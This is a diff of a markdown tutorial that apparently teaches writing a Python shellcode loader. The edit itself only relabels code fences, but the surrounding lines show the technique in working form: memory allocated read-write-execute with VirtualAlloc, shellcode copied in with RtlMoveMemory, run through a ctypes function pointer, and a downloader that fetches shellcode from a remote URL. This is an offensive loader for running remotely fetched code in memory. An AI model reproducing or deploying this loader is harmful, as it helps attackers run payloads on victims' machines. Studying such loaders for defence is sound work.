@@ -40,7 +40,8 @@ DWORD flProtect );
 - flAllocationType and flProtect indicates the allocation type and memory protection. We will use 0x3000 for the allocation type which will call VirtualAlloc with MEM_RESERVE and MEM_COMMIT. 0x40 indicates that the memory is readable, writable, and executable.
 
 Let's look at the python code:
-```
+
+```python
 shellcode = <shellcode here>
 length = len(shellcode)
 kernel32.VirtualAlloc.restype = ctypes.c_void_p
@@ -67,7 +68,8 @@ ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
  - Length is the number of bytes to copy from source to destination.
 
 In Python:
-```
+
+```python
 buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
 
 kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
@@ -136,7 +138,7 @@ Now we need to get the address of the mmap memory. We'll use ctypes from_buffer(
 
 Then all we need to do is create the function and call it to execute the shellcode.
 
-```
+```python
 functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
 
 fn = functype(ptr)
@@ -148,7 +150,7 @@ fn()
 # Downloading Shellcode
 Now that we are able to execute shellcode in memory in windows and linux, we need to create a function to download our shellcode remotely instead of hardcoding our shellcode. We can use urllib.request to do so.
 
-```
+```python
 def downloader(shellcode_url):
 
  with urllib.request.urlopen(shellcode_url) as f:
